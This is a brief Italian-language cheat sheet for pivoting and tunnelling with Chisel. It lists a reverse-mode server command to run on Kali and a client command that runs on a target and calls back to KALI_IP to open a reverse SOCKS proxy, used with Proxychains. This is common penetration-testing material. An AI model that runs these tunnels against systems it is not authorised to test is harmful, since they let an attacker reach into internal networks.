# 🛠️ Note Tecniche: Pivoting & Tunneling
**Strumento:** Chisel

## Setup Rapido
- **Kali (Server)**: `./chisel server -p 8000 --reverse`
- **Target (Client)**: `./chisel client KALI_IP:8000 R:1080:socks`
- **Proxychains**: Configurato su porta 1080 SOCKS5.
